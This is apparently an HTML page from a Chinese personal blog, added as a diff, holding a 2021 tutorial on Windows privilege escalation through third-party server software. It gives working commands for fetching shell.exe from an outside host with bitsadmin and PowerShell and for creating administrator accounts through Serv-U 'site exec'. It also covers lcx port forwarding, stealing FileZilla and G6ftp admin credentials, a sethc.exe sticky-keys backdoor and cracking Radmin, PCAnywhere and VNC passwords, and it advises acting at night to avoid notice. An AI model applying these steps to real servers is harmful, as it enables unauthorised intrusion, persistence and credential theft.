@@ -1,0 +1,315 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || 提权1（第三方提权）</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>提权<hanla></hanla>1（第三方提权） </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/24
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/提权篇">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span>
+                提权篇
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <p><hanla></hanla>各种漏洞拿到<hanla></hanla>shell<br><hanla></hanla>获取<hanla></hanla>webshell<hanla></hanla>权限可以对网站任意修改 </p>
+<span id="more"></span>
+
+<p>获取服务器的管理员权限 （系统权限）<br><hanla></hanla>1.<hanla></hanla>网络服务用户权限<br><hanla></hanla>2.webshell （对网站修改）<br><hanla></hanla>3.<hanla></hanla>系统权限 （管理员权限 system root<hanla></hanla>权限） </p>
+<p>asp /php  网络服务用户<br><hanla></hanla>aspx 普通用户权限 cms 可以调用<br><hanla></hanla>jsp  管理员权限 （管理员运行的容器）<br>脚本所处的权限取决于运行容器的用户身份。  </p>
+<p>小旋风<br><hanla></hanla>phpstudy  管理员权限  </p>
+<p>每个服务器上可能有多个容器，每个容器所处权限是不一样的，<br>有可能通过其他容器来实现提权（间接性提权） </p>
+<h2 id="收集信息"><a href="#收集信息" class="headerlink" title="收集信息"></a>收集信息</h2><p><hanla></hanla>1.<hanla></hanla>内外网<br>内网访问不到，通过网络边界映射<br><hanla></hanla>用<hanla></hanla>lcx  msf   端口转发<br><hanla></hanla>2.<hanla></hanla>服务器系统版本  位数<br><hanla></hanla>3.<hanla></hanla>服务器的补丁情况<br><hanla></hanla>systeminfo<br><hanla></hanla>300<hanla></hanla>个以上补丁很难在找漏洞<br>服务器一般要么一个补丁没打，要么打很多<br><hanla></hanla>开防火墙<hanla></hanla>msf<hanla></hanla>就不太容易利用了   </p>
+<p><hanla></hanla>4.<hanla></hanla>服务器的安装软件情况<br><hanla></hanla>tasklist<br><hanla></hanla>看默认安装目录<br><hanla></hanla>5.<hanla></hanla>服务器的防护软件情况<br><hanla></hanla>6.<hanla></hanla>端口情况<br><hanla></hanla>netstat -an<br><hanla></hanla>看端口  站酷分离（1521orcal）<br><hanla></hanla>7.<hanla></hanla>支持脚本的情况<br><hanla></hanla>asp<hanla></hanla>站点 asp<hanla></hanla>后缀 cmd 上传<hanla></hanla>cmd<hanla></hanla>也不能执行<br><hanla></hanla>aspx  系统<hanla></hanla>cmd<br><hanla></hanla>php 调用<hanla></hanla>cmd  </p>
+<h4 id="收集常用命令"><a href="#收集常用命令" class="headerlink" title="收集常用命令"></a>收集常用命令</h4><p><hanla></hanla>windows：<br><hanla></hanla>ipconfig /all 查看当前<hanla></hanla>ip<br>net user 查看当前服务器账号情况<br><hanla></hanla>netstat -ano 查看当前服务器端口开放情况<br><hanla></hanla>ver 查看当前服务器操作系统<br><hanla></hanla>systeminfo 查看当前服务器配置信息（补丁情况）<br>tasklist /svc 查看当前服务器进程情况<br><hanla></hanla>taskkill -PID pid<hanla></hanla>号 结束某个<hanla></hanla>pid<hanla></hanla>号的进程<br><hanla></hanla>taskkill /im qq.exe /f  结束<hanla></hanla>qq<hanla></hanla>进程<br><hanla></hanla>net user cracer cracer /add 添加一个用户名为<hanla></hanla>cracer<hanla></hanla>密码为<hanla></hanla>cracer<hanla></hanla>的用户<br><hanla></hanla>net localgroup administrators cracer /add<br><hanla></hanla>将用户<hanla></hanla>cracer<hanla></hanla>添加到管理员组<br><hanla></hanla>whoami 查看当前操作用户（当前权限）  </p>
+<p>linux： </p>
+<p>ls -al 查看当前目录下的文件和文件夹<br><hanla></hanla>pwd 查看当前操作路径<br><hanla></hanla>uname -a 查看当前服务器内核信息<br><hanla></hanla>whoami  </p>
+<p>漏洞补丁对比</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvxlr"><img src="https://s3.jpg.cm/2021/09/24/IFvxlr.png" alt="IFvxlr.png"></a></p>
+<h3 id="下载文件到服务器"><a href="#下载文件到服务器" class="headerlink" title="下载文件到服务器"></a>下载文件到服务器</h3><p><hanla></hanla>bitsadmin /transfern <a target="_blank" rel="noopener" href="http://www.cracer.com/shell.exe">http://www.cracer.com/shell.exe</a> d:\shell.exe<br>powershell (new-object system.net.webclient).doanloadfile(‘<a target="_blank" rel="noopener" href="http://www.cracer.com/x.exe','x.exe'">http://www.cracer.com/x.exe','x.exe'</a>)  </p>
+<p>nc 传文件<br><hanla></hanla>window 识别是根据<hanla></hanla>pe<hanla></hanla>结构<br>改成这样也能识别<br><hanla></hanla>cmd.aaa  </p>
+<h2 id="大马的使用"><a href="#大马的使用" class="headerlink" title="大马的使用"></a>大马的使用</h2><h4 id="cmd命令执行"><a href="#cmd命令执行" class="headerlink" title="cmd命令执行"></a><hanla></hanla>cmd<hanla></hanla>命令执行</h4><p><hanla></hanla>1.<hanla></hanla>防护软件拦截<br><hanla></hanla>2.cmd<hanla></hanla>被降权<br><hanla></hanla>3.<hanla></hanla>组件被删除<br><hanla></hanla>4.<hanla></hanla>虚拟主机无<hanla></hanla>cmd<hanla></hanla>调用<br><hanla></hanla>找可读写目录上传<hanla></hanla>cmd.exe，将执行的<hanla></hanla>cmd.exe<hanla></hanla>路径替换成上传的路径  ，<br>再次调用执行。  </p>
+<p><hanla></hanla>换脚本<hanla></hanla>/aspx/php  </p>
+<h4 id="查找3389"><a href="#查找3389" class="headerlink" title="查找3389"></a><hanla></hanla>查找<hanla></hanla>3389</h4><p><hanla></hanla>1.<hanla></hanla>注册表读取<br><hanla></hanla>2.<hanla></hanla>工具扫描<br><hanla></hanla>3.<hanla></hanla>命令探针</p>
+<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a><hanla></hanla>windows<hanla></hanla>提权</h1><h2 id="1-利用应用程序提权"><a href="#1-利用应用程序提权" class="headerlink" title="1.利用应用程序提权"></a><hanla></hanla>1.<hanla></hanla>利用应用程序提权</h2><p>常见的服务器软件<br><hanla></hanla>ftp<hanla></hanla>软件：<br>server-u   g6ftp  filezilla<br><hanla></hanla>远程管理软件<br><hanla></hanla>PCanywhere, radmin ,vnc  </p>
+<p><hanla></hanla>如果是第三方软件搭建的<hanla></hanla>ftp<br><hanla></hanla>很有可能用户名和账号是一样的<br><hanla></hanla>ftp<br>test<br>ceshi</p>
+<p>server - u 15.x<br><hanla></hanla>windows linux<hanla></hanla>都存在提权漏洞  </p>
+<h3 id="server-u-提权"><a href="#server-u-提权" class="headerlink" title="server -u 提权"></a>server -u 提权</h3><p>有修改权限<br><hanla></hanla>0<hanla></hanla>检查是否有可写权限   修改<hanla></hanla>server-u<hanla></hanla>默认安装目录下的<hanla></hanla>ServUDaemon.ini<br><hanla></hanla>1<hanla></hanla>增加用户<br><hanla></hanla>2<hanla></hanla>连接<br><hanla></hanla>3<hanla></hanla>执行命令<br><hanla></hanla>quote site exec net user cracer cracer.com /add<br>quote site exec net localgroup administrators cracer /add<br><hanla></hanla>无修改权限<br><hanla></hanla>暴力破解<hanla></hanla>md5  </p>
+<p>溢出提权  </p>
+<p><hanla></hanla>用<hanla></hanla>ftp<hanla></hanla>去连接的时候会看到是否使用了第三方软件</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvaiy"><img src="https://s3.jpg.cm/2021/09/24/IFvaiy.png" alt="IFvaiy.png"></a></p>
+<p><hanla></hanla>大马里面有个<hanla></hanla>server- u 安装目录</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvMhC"><img src="https://s3.jpg.cm/2021/09/24/IFvMhC.png" alt="IFvMhC.png"></a></p>
+<p>可以查看里面的配置文件，ServUDaemon.ini<br><hanla></hanla>可以查看有多少个账号 1 是代表启用的<br><hanla></hanla>密码是<hanla></hanla>MD5<hanla></hanla>加密<br>可以看到权限很高  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvDE5"><img src="https://s3.jpg.cm/2021/09/24/IFvDE5.png" alt="IFvDE5.png"></a> </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvTwe"><img src="https://s3.jpg.cm/2021/09/24/IFvTwe.png" alt="IFvTwe.png"></a></p>
+<p>这时候我们可以执行这两条命令来添加用户<br><hanla></hanla>quote site exec net user xy 123.com /add<br>quote site exec net localgroup administrator xy/add<br><hanla></hanla>创建一个<hanla></hanla>xy<hanla></hanla>用户并添加到管理员组  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFvZnt"><img src="https://s3.jpg.cm/2021/09/24/IFvZnt.png" alt="IFvZnt.png"></a></p>
+<p>如果解不出来密码，可以尝试写入一个密码<br><hanla></hanla>cq123456  加密然后写进去<hanla></hanla>cq<hanla></hanla>是盐，带着盐加密<br>或者还可以使用大马的功能  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwGtR"><img src="https://s3.jpg.cm/2021/09/24/IFwGtR.png" alt="IFwGtR.png"></a></p>
+<p>前提是这个大马的密码没修改<br><hanla></hanla>下载<hanla></hanla>ServUAdmin.exe<br><hanla></hanla>使用代码审计的<hanla></hanla>c32<hanla></hanla>工具<hanla></hanla>16<hanla></hanla>进制打开<br>搜索一下账号<br><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwIzz"><img src="https://s3.jpg.cm/2021/09/24/IFwIzz.png" alt="IFwIzz.png"></a></p>
+<h3 id="G6ftp提权"><a href="#G6ftp提权" class="headerlink" title="G6ftp提权"></a><hanla></hanla>G6ftp<hanla></hanla>提权</h3><p><hanla></hanla>下载管理配置文件，将<hanla></hanla>adminnistraotr<hanla></hanla>管理密码破解<br><hanla></hanla>使用<hanla></hanla>lcx 端口转发（默认只允许本机连接）<br>lcx.exe -tran 8027 127.0.0.1 8021<br><hanla></hanla>使用客户端以管理员用户登录<br>创建用户并设置权限和执行的批处理文件<br>上传批处理<br><hanla></hanla>以创建的普通用户登录<hanla></hanla>ftp<br><hanla></hanla>执行命令<br><hanla></hanla>quote site adduser<br>x.bat  内容为 添加系统用户 提权  </p>
+<p><hanla></hanla>在本地安装一个<hanla></hanla>G6ftp，去连接目标<hanla></hanla>192.168.0.200：8021<br><hanla></hanla>肯定连不上的，因为默认只能<hanla></hanla>127.0.0.1<hanla></hanla>登录 </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwPIu"><img src="https://s3.jpg.cm/2021/09/24/IFwPIu.png" alt="IFwPIu.png"></a></p>
+<p>那我们就用大马上传一个端口转发工具</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwRUG"><img src="https://s3.jpg.cm/2021/09/24/IFwRUG.png" alt="IFwRUG.png"></a></p>
+<p>然后执行端口转发命令</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwQj6"><img src="https://s3.jpg.cm/2021/09/24/IFwQj6.png" alt="IFwQj6.png"></a></p>
+<p><hanla></hanla>连接上去之后  点开<hanla></hanla>user – 新建一个用户<hanla></hanla>xy–随便指定一个家目录</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw7Ep"><img src="https://s3.jpg.cm/2021/09/24/IFw7Ep.png" alt="IFw7Ep.png"></a></p>
+<p>然后点开用户，把权限全选一下<br>点击站点命名–新建一个命令–上传一个批处理（上传路径是自己本地的）<br><hanla></hanla>或者用大马把<hanla></hanla>bat<hanla></hanla>上传上去，或者连接<hanla></hanla>ftp<hanla></hanla>上传上去  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw5lD"><img src="https://s3.jpg.cm/2021/09/24/IFw5lD.png" alt="IFw5lD.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwWxX"><img src="https://s3.jpg.cm/2021/09/24/IFwWxX.png" alt="IFwWxX.png"></a></p>
+<p><hanla></hanla>把批处理保存成<hanla></hanla>x.bat   上传</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwqw4"><img src="https://s3.jpg.cm/2021/09/24/IFwqw4.png" alt="IFwqw4.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwenT"><img src="https://s3.jpg.cm/2021/09/24/IFwenT.png" alt="IFwenT.png"></a></p>
+<p>然后执行这条命令，就会加载这个批处理文件</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwltE"><img src="https://s3.jpg.cm/2021/09/24/IFwltE.png" alt="IFwltE.png"></a></p>
+<h3 id="filezilla提权"><a href="#filezilla提权" class="headerlink" title="filezilla提权"></a><hanla></hanla>filezilla<hanla></hanla>提权</h3><p><hanla></hanla>filezilla<hanla></hanla>是一款开源的<hanla></hanla>FTP<hanla></hanla>服务器和客户端的软件。<br><hanla></hanla>若安装了服务器端默认只侦听<hanla></hanla>127.0.0.1<hanla></hanla>的<hanla></hanla>14147<hanla></hanla>端口<br>并且默认安装目录目录下有两个敏感文件 filezillaserver.xml<br><hanla></hanla>（包含了用户信息）和<hanla></hanla>filezillaserver interface.xml（包含了管理信息）<br>提权思路：<br>下载这个两个文件，拿到管理密码<br><hanla></hanla>配置端口转发，登录远程管理<hanla></hanla>ftpserve，创建<hanla></hanla>ftp<hanla></hanla>用户<br><hanla></hanla>分配权限，设置家目录为<hanla></hanla>C:\<br><hanla></hanla>使用<hanla></hanla>cmd.exe<hanla></hanla>改名为<hanla></hanla>sethc.exe<br><hanla></hanla>替换<hanla></hanla>c:\windows\system32\sethc.exe<br><hanla></hanla>生成<hanla></hanla>shift<hanla></hanla>后门<br>连<br><hanla></hanla>接<hanla></hanla>3389<hanla></hanla>按<hanla></hanla>5<hanla></hanla>次<hanla></hanla>shift 调出<hanla></hanla>cmd.exe  </p>
+<p>首先找程序安装目录，找密码，  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw60Q"><img src="https://s3.jpg.cm/2021/09/24/IFw60Q.png" alt="IFw60Q.png"></a></p>
+<p><hanla></hanla>因为它只能本地连接，所以也要用<hanla></hanla>lcx<hanla></hanla>端口转发<br><hanla></hanla> 本地安装<hanla></hanla>filezilla_server<br><hanla></hanla>连接  一般没有密码</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw8Ih"><img src="https://s3.jpg.cm/2021/09/24/IFw8Ih.png" alt="IFw8Ih.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwAUS"><img src="https://s3.jpg.cm/2021/09/24/IFwAUS.png" alt="IFwAUS.png"></a></p>
+<p>登录进来后创建一个账号</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwuFL"><img src="https://s3.jpg.cm/2021/09/24/IFwuFL.png" alt="IFwuFL.png"></a></p>
+<p>设置密码</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwcx2"><img src="https://s3.jpg.cm/2021/09/24/IFwcx2.png" alt="IFwcx2.png"></a></p>
+<p><hanla></hanla>然后设置共享文件夹在<hanla></hanla>c<hanla></hanla>盘，权限都勾选上</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw1jf"><img src="https://s3.jpg.cm/2021/09/24/IFw1jf.png" alt="IFw1jf.png"></a></p>
+<p>然后用客户端来连接服务器<br><hanla></hanla>这时候可以把<hanla></hanla>sethc<hanla></hanla>进行替换</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwb6H"><img src="https://s3.jpg.cm/2021/09/24/IFwb6H.png" alt="IFwb6H.png"></a></p>
+<p><hanla></hanla>假设管理员默认开了<hanla></hanla>3389<hanla></hanla>端口</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwXoW"><img src="https://s3.jpg.cm/2021/09/24/IFwXoW.png" alt="IFwXoW.png"></a></p>
+<p><hanla></hanla>运行—mstsc,<hanla></hanla>远程连接它</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwJ5U"><img src="https://s3.jpg.cm/2021/09/24/IFwJ5U.png" alt="IFwJ5U.png"></a></p>
+<p><hanla></hanla>这时候按五次<hanla></hanla>shift<hanla></hanla>就会调出<hanla></hanla>cmd<br>taskmgr<br><hanla></hanla>可以调出任务管理器<br><hanla></hanla>explorer.exe<br><hanla></hanla>桌面也可以调出来 </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwttO"><img src="https://s3.jpg.cm/2021/09/24/IFwttO.png" alt="IFwttO.png"></a></p>
+<p><hanla></hanla>那么问题来了<hanla></hanla>08<hanla></hanla>就不能这样搞了<br><hanla></hanla>进不了这个界面按<hanla></hanla>5<hanla></hanla>次<hanla></hanla>shift<br><hanla></hanla>但是<hanla></hanla>c<hanla></hanla>盘都可以修改，我们是不是可以对<hanla></hanla>c<hanla></hanla>盘<br><hanla></hanla>能运行的文件进行<hanla></hanla>msf<hanla></hanla>的捆绑<br><hanla></hanla>explorer.exe  + msf payload cs<br><hanla></hanla>比如捆绑默认输入法<br><hanla></hanla>dll  lpk.dll<hanla></hanla>劫持提权  </p>
+<h3 id="远程管理软件提权"><a href="#远程管理软件提权" class="headerlink" title="远程管理软件提权"></a>远程管理软件提权</h3><p><hanla></hanla>pyanywhere<br> pcanywhere<br><hanla></hanla>访问<br><hanla></hanla>pcanywhere<hanla></hanla>默认安装目录<br>下载用户配置文件  </p>
+<p>通过破解账户密码文件  </p>
+<p>把这个文件下载下来<br>但是这种操作都是同步的你操作它看的见，晚上搞  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwN0w"><img src="https://s3.jpg.cm/2021/09/24/IFwN0w.png" alt="IFwN0w.png"></a></p>
+<p>然后用破解工具破解</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwYL8"><img src="https://s3.jpg.cm/2021/09/24/IFwYL8.png" alt="IFwYL8.png"></a></p>
+<p><hanla></hanla>然后下载一个<hanla></hanla>pcanywhere<hanla></hanla>去远程连接它</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwrUi"><img src="https://s3.jpg.cm/2021/09/24/IFwrUi.png" alt="IFwrUi.png"></a></p>
+<h3 id="radmin提权"><a href="#radmin提权" class="headerlink" title="radmin提权"></a><hanla></hanla>radmin<hanla></hanla>提权</h3><p>通过端口扫描<br><hanla></hanla>扫描<hanla></hanla>4899<hanla></hanla>端口<br><hanla></hanla>上传<hanla></hanla>radmin.asp<hanla></hanla>木马<br><hanla></hanla>读取<hanla></hanla>radmin<hanla></hanla>的加密密文<br>使用工具连接  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwoNt"><img src="https://s3.jpg.cm/2021/09/24/IFwoNt.png" alt="IFwoNt.png"></a></p>
+<p><hanla></hanla>或者直接用<hanla></hanla>radmin<hanla></hanla>提权，直接读出一串<hanla></hanla>MD5<hanla></hanla>值</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwpy5"><img src="https://s3.jpg.cm/2021/09/24/IFwpy5.png" alt="IFwpy5.png"></a></p>
+<p>连接的时候要注意，是小写</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFww5C"><img src="https://s3.jpg.cm/2021/09/24/IFww5C.png" alt="IFww5C.png"></a></p>
+<p>但是连上之后操作窗口也是同步的，还是得晚上来</p>
+<h3 id="vnc提权"><a href="#vnc提权" class="headerlink" title="vnc提权"></a><hanla></hanla>vnc<hanla></hanla>提权</h3><p><hanla></hanla>读取<hanla></hanla>vnc<hanla></hanla>密码</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwmFr"><img src="https://s3.jpg.cm/2021/09/24/IFwmFr.png" alt="IFwmFr.png"></a></p>
+<p>搜索批量进制转换</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFwk6y"><img src="https://s3.jpg.cm/2021/09/24/IFwk6y.png" alt="IFwk6y.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IFw42R"><img src="https://s3.jpg.cm/2021/09/24/IFw42R.png" alt="IFw42R.png"></a></p>
+<p>直接读出来密码了<br><hanla></hanla>r<hanla></hanla>然后用<hanla></hanla>vnc<hanla></hanla>去连接</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
